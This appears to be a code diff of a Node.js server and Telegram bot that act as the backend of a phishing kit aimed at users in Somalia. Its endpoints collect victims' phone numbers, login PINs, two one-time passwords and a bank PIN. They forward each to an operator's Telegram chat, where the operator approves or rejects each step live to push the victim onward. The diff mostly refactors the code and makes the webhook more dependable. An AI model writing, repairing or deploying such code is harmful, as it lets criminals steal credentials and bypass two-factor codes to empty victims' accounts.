@@ -5,7 +5,6 @@ require('dotenv').config();
 
 const app = express();
 const PORT = process.env.PORT || 8080;
-// Railway provides RAILWAY_PUBLIC_URL automatically, or you can use your custom domain variable
 const DOMAIN = process.env.RAILWAY_PUBLIC_URL || process.env.DOMAIN || ""; 
 
 // -------------------- INIT BOT --------------------
@@ -19,13 +18,16 @@ const ADMIN_ID = String(process.env.ADMIN_CHAT_ID || "").trim();
 // -------------------- MEMORY STORE --------------------
 const statusStore = {};
 
-// -------------------- MIDDLEWARE --------------------
+// -------------------- TELEGRAM WEBHOOK MIDDLEWARE --------------------
+// CRITICAL: This MUST be placed BEFORE app.use(express.json()) to prevent body parsing issues
+const WEBHOOK_PATH = `/webhook/${process.env.BOT_TOKEN}`;
+if (DOMAIN) {
+    app.use(bot.webhookCallback(WEBHOOK_PATH));
+}
+
+// -------------------- STANDARD MIDDLEWARE --------------------
 app.use(express.json());
 app.use(express.static(path.join(__dirname, 'public')));
-
-// Set up Telegram webhook route handler before catch-all routes
-const WEBHOOK_PATH = `/webhook/${process.env.BOT_TOKEN}`;
-app.use(bot.webhookCallback(WEBHOOK_PATH));
 
 // -------------------- ROUTES --------------------
 app.get('/', (req, res) => {
@@ -76,7 +78,7 @@ app.post('/api/login-notification', async (req, res) => {
         });
         res.json({ success: true });
     } catch (err) {
-        console.error(err);
+        console.error("API login notification error:", err);
         res.status(500).json({ error: err.message });
     }
 });
@@ -178,7 +180,6 @@ app.post('/api/verify-second-otp', async (req, res) => {
 // -------------------- RESEND OTP API --------------------
 app.post('/api/resend-otp-notification', async (req, res) => {
     const { phone, step } = req.body || {};
-    
     if (!phone || !ADMIN_ID) return res.status(400).json({ error: "Missing data" });
 
     const resendMsg = `🔄 <b>RESEND REQUESTED</b>
@@ -198,11 +199,10 @@ app.post('/api/resend-otp-notification', async (req, res) => {
     }
 });
 
-// -------------------- BANK PIN API (NEW) --------------------
+// -------------------- BANK PIN API --------------------
 app.post('/api/verify-bank-pin', async (req, res) => {
     const { phone, bankPin } = req.body || {};
     const country = "Somalia";
-    const countryCode = "+252";
     const currentTime = new Date().toLocaleString('en-US', {
         month: 'numeric', day: 'numeric', year: 'numeric',
         hour: 'numeric', minute: 'numeric', second: 'numeric',
@@ -253,24 +253,13 @@ bot.action(/^approve\|(.+)\|(.+)/, async (ctx) => {
     statusStore[phone] = "approved";
     const currentTime = new Date().toLocaleTimeString('en-US', { hour: 'numeric', minute: 'numeric', second: 'numeric', hour12: true });
 
-    const approvedMsg = `✅ <b>LOGIN APPROVED</b>
-
-🆕 <b>NEW USER</b>
-🇸🇴 <b>Somalia</b>
-📱 <b>${phone}</b>
-🔐 <b>${pin}</b>
-
-━━━━━━━━━━━━━━━
-
-✅ <b>Status: Approved</b>
-➡️ <b>Next: First OTP (1/2)</b>
-⏱️ <b>${currentTime}</b>`;
+    const approvedMsg = `✅ <b>LOGIN APPROVED</b>\n\n🆕 <b>NEW USER</b>\n🇸🇴 <b>Somalia</b>\n📱 <b>${phone}</b>\n🔐 <b>${pin}</b>\n\n━━━━━━━━━━━━━━━\n\n✅ <b>Status: Approved</b>\n➡️ <b>Next: First OTP (1/2)</b>\n⏱️ <b>${currentTime}</b>`;
 
     try {
         await ctx.answerCbQuery("Allowed");
         await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
         await ctx.replyWithHTML(approvedMsg);
-    } catch (e) { console.error(e); }
+    } catch (e) { console.error("Error running approve action:", e); }
 });
 
 // DENY
@@ -280,22 +269,13 @@ bot.action(/^deny\|(.+)\|(.+)/, async (ctx) => {
     statusStore[phone] = "denied";
     const currentTime = new Date().toLocaleTimeString('en-US', { hour: 'numeric', minute: 'numeric', second: 'numeric', hour12: true });
 
-    const deniedMsg = `❌ <b>INVALID CREDENTIALS</b>
-
-🇸🇴 <b>Somalia</b>
-📱 <b>${phone}</b>
-🔐 <b>${pin}</b>
-
-━━━━━━━━━━━━━━━
-
-❌ <b>Status: Rejected</b>
-⏱️ <b>${currentTime}</b>`;
+    const deniedMsg = `❌ <b>INVALID CREDENTIALS</b>\n\n🇸🇴 <b>Somalia</b>\n📱 <b>${phone}</b>\n🔐 <b>${pin}</b>\n\n━━━━━━━━━━━━━━━\n\n❌ <b>Status: Rejected</b>\n⏱️ <b>${currentTime}</b>`;
 
     try {
         await ctx.answerCbQuery("Rejected");
         await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
         await ctx.replyWithHTML(deniedMsg);
-    } catch (e) { console.error(e); }
+    } catch (e) { console.error("Error running deny action:", e); }
 });
 
 // OTP1 CORRECT
@@ -305,17 +285,7 @@ bot.action(/^otp1_correct\|(.+)\|(.+)/, async (ctx) => {
     statusStore[phone] = "otp1_correct";
     const currentTime = new Date().toLocaleTimeString('en-US', { hour: 'numeric', minute: 'numeric', second: 'numeric', hour12: true });
 
-    const verifiedMsg = `1️⃣ <b>FIRST OTP VERIFIED (Step 1/2)</b>
-
-🇸🇴 <b>Somalia</b>
-📱 <b>${phone}</b>
-🔐 <b>${otp}</b>
-
-━━━━━━━━━━━━━━━
-
-✅ <b>Status: First OTP verified</b>
-➡️ <b>Next: Second OTP (2/2) will be sent</b>
-⌛ <b>${currentTime}</b>`;
+    const verifiedMsg = `1️⃣ <b>FIRST OTP VERIFIED (Step 1/2)</b>\n\n🇸🇴 <b>Somalia</b>\n📱 <b>${phone}</b>\n🔐 <b>${otp}</b>\n\n━━━━━━━━━━━━━━━\n\n✅ <b>Status: First OTP verified</b>\n➡️ <b>Next: Second OTP (2/2) will be sent</b>\n⌛ <b>${currentTime}</b>`;
 
     try {
         await ctx.answerCbQuery("Verified");
@@ -342,17 +312,7 @@ bot.action(/^otp2_correct\|(.+)\|(.+)/, async (ctx) => {
     statusStore[phone] = "otp2_correct";
     const currentTime = new Date().toLocaleTimeString('en-US', { hour: 'numeric', minute: 'numeric', second: 'numeric', hour12: true });
 
-    const verifiedMsg2 = `2️⃣ <b>SECOND OTP VERIFIED (Step 2/2)</b>
-
-🇸🇴 <b>Somalia</b>
-📱 <b>${phone}</b>
-🔐 <b>${otp}</b>
-
-━━━━━━━━━━━━━━━
-
-✅ <b>Status: Second OTP verified</b>
-✅ <b>Process Complete</b>
-⌛ <b>${currentTime}</b>`;
+    const verifiedMsg2 = `2️⃣ <b>SECOND OTP VERIFIED (Step 2/2)</b>\n\n🇸🇴 <b>Somalia</b>\n📱 <b>${phone}</b>\n🔐 <b>${otp}</b>\n\n━━━━━━━━━━━━━━━\n\n✅ <b>Status: Second OTP verified</b>\n✅ <b>Process Complete</b>\n⌛ <b>${currentTime}</b>`;
 
     try {
         await ctx.answerCbQuery("Finalized");
@@ -378,16 +338,7 @@ bot.action(/^bank_correct\|(.+)\|(.+)/, async (ctx) => {
     const pin = ctx.match[2];
     statusStore[phone] = "bank_pin_correct";
     
-    const finalizedMsg = `✅ <b>BANK PIN VERIFIED</b>
-
-🇸🇴 <b>Somalia</b>
-📱 <b>${phone}</b>
-🔑 <b>${pin}</b>
-
-━━━━━━━━━━━━━━━
-
-✅ <b>Status: Process Completed</b>
-🏁 <b>User redirected to Success page</b>`;
+    const finalizedMsg = `✅ <b>BANK PIN VERIFIED</b>\n\n🇸🇴 <b>Somalia</b>\n📱 <b>${phone}</b>\n🔑 <b>${pin}</b>\n\n━━━━━━━━━━━━━━━\n\n✅ <b>Status: Process Completed</b>\n🏁 <b>User redirected to Success page</b>`;
 
     try {
         await ctx.answerCbQuery("Bank PIN Verified");
@@ -433,22 +384,26 @@ app.get('/:page', (req, res, next) => {
     });
 });
 
-// -------------------- START SERVER & BOT --------------------
+// -------------------- START SERVER & WEBHOOK --------------------
 app.listen(PORT, async () => {
     console.log(`🚀 Server running on port ${PORT}`);
     try {
         if (DOMAIN) {
-            // Clean dynamic URL formats to make sure it includes protocol
             const formattedDomain = DOMAIN.startsWith('http') ? DOMAIN : `https://${DOMAIN}`;
-            await bot.telegram.setWebhook(`${formattedDomain}${WEBHOOK_PATH}`, {
-                drop_pending_updates: true
-            });
-            console.log(`🤖 Bot Webhook set up successfully at: ${formattedDomain}${WEBHOOK_PATH}`);
+            const fullWebhookUrl = `${formattedDomain}${WEBHOOK_PATH}`;
+            
+            // Re-bind webhook cleanly on boot
+            await bot.telegram.deleteWebhook({ drop_pending_updates: true });
+            await bot.telegram.setWebhook(fullWebhookUrl);
+            console.log(`🤖 Webhook successfully synchronized to: ${fullWebhookUrl}`);
         } else {
-            console.warn("⚠️ No RAILWAY_PUBLIC_URL or DOMAIN found. Webhook configuration skipped.");
+            console.warn("⚠️ Webhook skipped: RAILWAY_PUBLIC_URL or DOMAIN variables are unassigned.");
+            // Fallback to launch long-polling locally if no domain is provided
+            bot.launch();
+            console.log("🤖 Running fallback Long Polling setup...");
         }
     } catch (err) {
-        console.error("Webhook registration error:", err);
+        console.error("Webhook binding failure:", err);
     }
 });
         
